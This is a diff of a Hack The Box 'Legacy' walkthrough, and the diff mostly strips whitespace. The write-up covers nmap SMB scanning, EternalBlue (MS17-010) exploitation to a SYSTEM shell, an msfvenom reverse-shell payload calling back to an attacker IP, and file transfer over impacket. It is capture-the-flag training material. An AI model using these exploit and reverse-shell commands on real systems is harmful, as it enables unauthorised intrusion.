@@ -60,16 +60,16 @@ PORT    STATE SERVICE
 445/tcp open  microsoft-ds
 
 Host script results:
-| smb-enum-shares: 
+| smb-enum-shares:
 |   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
-|   account_used: <blank>
-|   \\10.10.10.4\ADMIN$: 
+|   account_used: <blank />
+|   \\10.10.10.4\ADMIN$:
 |     warning: Couldnt get details for share: NT_STATUS_ACCESS_DENIED
-|     Anonymous access: <none>
-|   \\10.10.10.4\C$: 
+|     Anonymous access: <none />
+|   \\10.10.10.4\C$:
 |     warning: Couldnt get details for share: NT_STATUS_ACCESS_DENIED
-|     Anonymous access: <none>
-|   \\10.10.10.4\IPC$: 
+|     Anonymous access: <none />
+|   \\10.10.10.4\IPC$:
 |     warning: Couldnt get details for share: NT_STATUS_ACCESS_DENIED
 |_    Anonymous access: READ
 
@@ -80,31 +80,31 @@ then, `--script smb-vuln*`:
 
 ```bash
 └─$ nmap --script smb-vuln* -p 139,445 10.10.10.4 -Pn
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-14 09:38 NZDT                                                    
-Nmap scan report for 10.10.10.4                                                                                     
-Host is up (0.70s latency).                                                                                         
-                                                                                                                    
-PORT    STATE SERVICE                                                                                               
-139/tcp open  netbios-ssn                                                                                           
-445/tcp open  microsoft-ds                                                                                          
-                                                                                                                    
-Host script results:                                                                                                
-| smb-vuln-ms17-010:                                                                                                
-|   VULNERABLE:                                                                                                     
-|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)                                       
-|     State: VULNERABLE                                                                                             
-|     IDs:  CVE:CVE-2017-0143                                                                                       
-|     Risk factor: HIGH                                                                                             
-|       A critical remote code execution vulnerability exists in Microsoft SMBv1                                    
-|        servers (ms17-010).                                                                                        
-|                                                                                                                   
-|     Disclosure date: 2017-03-14                                                                                   
-|     References:                                                                                                   
-|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx                                          
-|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143                                                
-|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/               
-|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)                                               
-|_smb-vuln-ms10-054: false 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-14 09:38 NZDT
+Nmap scan report for 10.10.10.4
+Host is up (0.70s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+|_smb-vuln-ms10-054: false
 ```
 
 We got a hit! Looks like the ol' EternalBlue exploit!
@@ -173,7 +173,7 @@ userAndGroupCount: 0x3
 userAndGroupsAddr: 0xe1b76260
 [*] overwriting token UserAndGroups
 [*] have fun with the system smb session!
-[!] Dropping a semi-interactive shell (remember to escape special chars with ^) 
+[!] Dropping a semi-interactive shell (remember to escape special chars with ^)
 [!] Executing interactive programs will hang shell!
 C:\WINDOWS\system32>
 ```
@@ -188,8 +188,8 @@ C:\WINDOWS\system32>net user
 User accounts for \\
 
 -------------------------------------------------------------------------------
-Administrator            Guest                    HelpAssistant            
-john                     SUPPORT_388945a0         
+Administrator            Guest                    HelpAssistant
+john                     SUPPORT_388945a0
 The command completed with one or more errors.
 
 
@@ -208,8 +208,8 @@ C:\WINDOWS\system32>net session
 Computer               User name            Client Type       Opens Idle time
 
 -------------------------------------------------------------------------------
-\\10.10.16.4                                posix                 2 00:00:00    
-\\127.0.0.1                                 Windows 2002 Serv     2 00:00:00    
+\\10.10.16.4                                posix                 2 00:00:00
+\\127.0.0.1                                 Windows 2002 Serv     2 00:00:00
 The command completed successfully.
 ```
 
@@ -233,7 +233,7 @@ I copied the following scripts to their own folder (clean workspace):
 * `mysmb.py`
 * `zzz_exploit.py` - in case this method bombs out as well lol.
 
-I generate my reverse shell *.exe with: 
+I generate my reverse shell *.exe with:
 
 * `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe`
 
@@ -256,7 +256,7 @@ Using named pipe: browser
 Groom packets
 attempt controlling next transaction on x86
 Traceback (most recent call last):
-  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/./send_and_execute.py", line 1077, in <module>
+  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/./send_and_execute.py", line 1077, in <module />
     exploit(target, port, pipe_name)
   File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/./send_and_execute.py", line 839, in exploit
     if not info['method'](conn, pipe_name, info):
@@ -296,7 +296,7 @@ RUN pip install ldap3==2.5.1 \
 WORKDIR /app
 
 # copy our files from host to container
-COPY ms17-010.exe send_and_execute.py mysmb.py /app/ 
+COPY ms17-010.exe send_and_execute.py mysmb.py /app/
 
 # download & install impacket
 RUN git clone https://github.com/SecureAuthCorp/impacket.git
@@ -373,12 +373,12 @@ Let's find the user flag:
 
  Directory of C:\Documents and Settings\john
 
-16/03/2017  08:33 ��    <DIR>          .
-16/03/2017  08:33 ��    <DIR>          ..
-16/03/2017  09:19 ��    <DIR>          Desktop
-16/03/2017  08:33 ��    <DIR>          Favorites
-16/03/2017  08:33 ��    <DIR>          My Documents
-16/03/2017  08:20 ��    <DIR>          Start Menu
+16/03/2017  08:33 ��    <DIR />          .
+16/03/2017  08:33 ��    <DIR />          ..
+16/03/2017  09:19 ��    <DIR />          Desktop
+16/03/2017  08:33 ��    <DIR />          Favorites
+16/03/2017  08:33 ��    <DIR />          My Documents
+16/03/2017  08:20 ��    <DIR />          Start Menu
                0 File(s)              0 bytes
                6 Dir(s)   6.313.111.552 bytes free
 
@@ -389,8 +389,8 @@ dir john\Desktop
 
  Directory of C:\Documents and Settings\john\Desktop
 
-16/03/2017  09:19 ��    <DIR>          .
-16/03/2017  09:19 ��    <DIR>          ..
+16/03/2017  09:19 ��    <DIR />          .
+16/03/2017  09:19 ��    <DIR />          ..
 16/03/2017  09:19 ��                32 user.txt
                1 File(s)             32 bytes
                2 Dir(s)   6.313.111.552 bytes free
@@ -413,7 +413,7 @@ On my attack machine (kali), inside the dir I want to serve, run `impacket-smbse
 
 ```bash
 ┌──(rxhackk㉿kali)-[~/…/winPEAS/winPEASexe/binaries/Release]-[tun0: 10.10.16.2]
-└─$ impacket-smbserver  tools .           
+└─$ impacket-smbserver  tools .
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
 
 [*] Config file parsed
@@ -436,7 +436,7 @@ Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corpo
 [-] Unknown level for query path info! 0x109
 ```
 
-Over on my reverse shell setup by my `bluexp` eternalblue docker container, I can do this to copy `winpeasany.exe` to the Windows machine: 
+Over on my reverse shell setup by my `bluexp` eternalblue docker container, I can do this to copy `winpeasany.exe` to the Windows machine:
 
 * `copy \\$ip\$dir\winpeasany.exe c:\winpeasany.exe`
 
@@ -454,8 +454,8 @@ I didn't even need to privesc cos I could get to the Administrator files already
 
  Directory of C:\Documents and Settings\Administrator\Desktop
 
-16/03/2017  09:18     <DIR>          .
-16/03/2017  09:18     <DIR>          ..
+16/03/2017  09:18     <DIR />          .
+16/03/2017  09:18     <DIR />          ..
 16/03/2017  09:18                 32 root.txt
                1 File(s)             32 bytes
                2 Dir(s)   6.398.578.688 bytes free
@@ -477,18 +477,18 @@ Success and my very first HTB box completed.
 the dilemma:
 
 ```sh
-└─$ python3 zzz_exploit.py 10.10.10.4                                                                               
-Target OS: Windows 5.1                                                                                              
-Using named pipe: browser                                                                                           
+└─$ python3 zzz_exploit.py 10.10.10.4
+Target OS: Windows 5.1
+Using named pipe: browser
 Groom packets
 Traceback (most recent call last):
-  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/zzz_exploit.py", line 1064, in <module>
+  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/zzz_exploit.py", line 1064, in <module />
     exploit(target, port, pipe_name)
   File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/zzz_exploit.py", line 835, in exploit
     if not info['method'](conn, pipe_name, info):
   File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/zzz_exploit.py", line 612, in exploit_fish_bar
 rel
-    conn.send_trans('', mid=mid, param=trans_param, totalParameterCount=0x100-TRANS_NAME_LEN, totalDataCount=0xec0, 
+    conn.send_trans('', mid=mid, param=trans_param, totalParameterCount=0x100-TRANS_NAME_LEN, totalDataCount=0xec0,
 maxParameterCount=0x40, maxDataCount=0)
   File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 262, in send_trans
     self.send_raw(self.create_trans_packet(setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCou
@@ -505,7 +505,7 @@ or env doesnt' wanna know about python2
 ```sh
 └─$ ./zzz_exploit.py 10.10.10.4                                                                                 1 ⨯
 Traceback (most recent call last):
-  File "./zzz_exploit.py", line 2, in <module>
+  File "./zzz_exploit.py", line 2, in <module />
     from impacket import smb, smbconnection
 ImportError: No module named impacket
 ```
@@ -525,7 +525,7 @@ at the top.
 Trying to connect to 10.10.10.4:445
 Target OS: Windows 5.1
 Traceback (most recent call last):
-  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/./checker.py", line 65, in <module>
+  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/./checker.py", line 65, in <module />
     recvPkt = conn.send_trans(pack('<H', TRANS_PEEK_NMPIPE), maxParameterCount=0xffff, maxDataCount=0x800)
   File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 262, in send_trans
     self.send_raw(self.create_trans_packet(setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCount, maxParameterCount, maxDataCount, pid, tid, noPad))
